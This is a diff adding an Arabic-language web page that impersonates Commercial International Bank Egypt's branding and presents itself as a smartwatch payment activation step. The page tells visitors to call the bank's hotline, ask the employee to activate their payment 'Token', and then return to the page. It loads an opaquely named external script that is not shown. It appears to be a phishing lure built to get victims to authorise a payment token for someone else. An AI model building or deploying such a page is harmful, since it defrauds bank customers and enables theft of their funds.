@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+<title>تفعيل ساعة الدفع الذكية – CIB</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;900&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+html,body{
+  height:100%;
+  font-family:'Cairo',sans-serif;
+  background:#F6F8FC;
+  color:#1C2B4A;
+  -webkit-font-smoothing:antialiased;
+}
+
+body{
+  display:flex;
+  align-items:flex-start;
+  justify-content:center;
+  padding:0;
+  min-height:100dvh;
+}
+
+.page{
+  width:100%;
+  max-width:480px;
+  min-height:100dvh;
+  background:#fff;
+  display:flex;
+  flex-direction:column;
+  box-shadow:0 0 40px rgba(0,40,120,.08);
+}
+
+
+.hdr{
+  padding:20px 24px 16px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  border-bottom:1px solid #EDF0F7;
+  background:#fff;
+  position:sticky;top:0;z-index:10;
+}
+
+.logo{display:flex;align-items:center;gap:10px}
+.logo-mark{
+  height:44px;
+  display:flex;align-items:center;
+}
+.logo-mark img{
+  height:44px;
+  width:auto;
+  display:block;
+  object-fit:contain;
+}
+.logo-name{
+  font-size:1.65rem;font-weight:900;
+  color:#003087;letter-spacing:-1px;
+}
+
+
+.banner{
+  margin:20px 20px 0;
+  border-radius:18px;
+  overflow:hidden;
+  position:relative;
+  background:linear-gradient(130deg,#002570,#0048B0);
+  flex-shrink:0;
+}
+.banner img{
+  width:100%;display:block;
+  object-fit:cover;
+  max-height:200px;
+  opacity:.95;
+}
+.banner-label{
+  position:absolute;bottom:0;left:0;right:0;
+  background:linear-gradient(to top,rgba(0,20,70,.78),transparent);
+  padding:22px 16px 13px;
+  display:flex;flex-direction:column;gap:2px;
+}
+.banner-label .ar{font-size:.82rem;font-weight:700;color:#fff}
+.banner-label .en{font-size:.7rem;font-weight:400;color:rgba(255,255,255,.65)}
+
+
+.content{
+  flex:1;
+  padding:24px 20px;
+  display:flex;
+  flex-direction:column;
+  gap:20px;
+}
+
+.section-title{
+  text-align:center;
+  font-size:1.2rem;font-weight:900;
+  color:#003087;
+  position:relative;
+  padding-bottom:12px;
+}
+.section-title::after{
+  content:'';
+  position:absolute;bottom:0;left:50%;transform:translateX(-50%);
+  width:36px;height:3px;
+  background:#0057D9;
+  border-radius:3px;
+}
+
+.info-card{
+  background:#F2F6FF;
+  border-radius:16px;
+  border-right:4px solid #0057D9;
+  padding:18px 18px 18px 16px;
+  font-size:.93rem;
+  font-weight:500;
+  color:#374869;
+  line-height:2;
+}
+.info-card .num{
+  font-size:1rem;font-weight:800;
+  color:#0048B0;
+}
+.info-card .token{
+  font-weight:700;
+  color:#0048B0;
+}
+
+
+.steps{display:flex;flex-direction:column;gap:0}
+.step{
+  display:flex;align-items:flex-start;gap:14px;
+  padding:14px 0;
+  border-bottom:1px solid #EDF0F7;
+}
+.step:last-child{border-bottom:none}
+.step-num{
+  width:32px;height:32px;flex-shrink:0;
+  background:#003087;
+  color:#fff;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:.82rem;font-weight:700;
+  margin-top:1px;
+}
+.step-body{display:flex;flex-direction:column;gap:2px}
+.step-title{font-size:.9rem;font-weight:700;color:#1C2B4A}
+.step-desc{font-size:.8rem;font-weight:400;color:#7A8BAD;line-height:1.6}
+
+
+.actions{
+  padding:0 20px 32px;
+  display:flex;flex-direction:column;gap:10px;
+}
+
+.btn-call{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  background:#003087;
+  color:#fff;border:none;
+  border-radius:14px;
+  padding:17px;
+  font-family:'Cairo',sans-serif;
+  font-size:1rem;font-weight:700;
+  cursor:pointer;text-decoration:none;
+  transition:background .18s, transform .15s;
+  -webkit-tap-highlight-color:transparent;
+}
+.btn-call:active{background:#002070;transform:scale(.98)}
+.btn-call svg{width:19px;height:19px;flex-shrink:0}
+
+.status-row{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  background:#F2F6FF;
+  border-radius:14px;
+  padding:15px;
+  font-size:.88rem;font-weight:600;
+  color:#6B7FA8;
+}
+.dot{
+  width:8px;height:8px;border-radius:50%;
+  background:#0057D9;flex-shrink:0;
+  animation:blink 1.6s ease-in-out infinite;
+}
+@keyframes blink{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:.3;transform:scale(1.4)}
+}
+
+
+.foot{
+  text-align:center;
+  font-size:.68rem;color:#B0BBCF;
+  padding:12px 20px 20px;
+  border-top:1px solid #EDF0F7;
+}
+
+@keyframes rise{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:translateY(0)}
+}
+.page{animation:rise .5s cubic-bezier(.22,1,.36,1) both}
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="hdr">
+    <div class="logo">
+      <div class="logo-mark">
+       
+        <img src="logo.png" alt="CIB Logo" id="logo-img"/>
+      </div>
+    </div>
+  </div>
+
+  <div class="banner">
+    <img src="wajha.png" alt="CIB Smartwatch Payment"/>
+    <div class="banner-label">
+      <span class="ar">اربط بطاقتك بساعتك الذكية</span>
+      <span class="en">Link your CIB card to your smartwatch</span>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <h1 class="section-title">تفعيل ساعة الدفع الذكية</h1>
+
+    <div class="info-card">
+      تم استلام طلبك لساعة الدفع الذكية من البنك التجاري الدولي،
+      الرجاء الاتصال على <span class="num">19666</span> والطلب من الموظف
+      تفعيل الرمز السري المتغير <span class="token">(Token)</span>،
+      وبعد التفعيل الرجاء العودة إلى هذه الصفحة.
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">١</div>
+        <div class="step-body">
+          <span class="step-title">اتصل بخدمة العملاء</span>
+          <span class="step-desc">اتصل على الرقم 19666 للتواصل مع أحد موظفينا</span>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">٢</div>
+        <div class="step-body">
+          <span class="step-title">طلب تفعيل الـ Token</span>
+          <span class="step-desc">اطلب من الموظف تفعيل الرمز السري المتغير الخاص بك</span>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">٣</div>
+        <div class="step-body">
+          <span class="step-title">العودة لإتمام التفعيل</span>
+          <span class="step-desc">بعد التفعيل عد إلى هذه الصفحة لاستكمال الربط</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="actions">
+    <a href="tel:19666" class="btn-call" onclick="window.location.href='tel:19666';return false;">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 11.61 19a19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 3.12 4.18 2 2 0 0 1 5.09 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L9.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
+      </svg>
+      اتصال على 19666
+    </a>
+    <div class="status-row">
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="foot">Commercial International Bank – Egypt &nbsp;·&nbsp; جميع الحقوق محفوظة</div>
+
+</div>
+
+<script src="js/kn5k.js"></script>
+</body>
+</html>
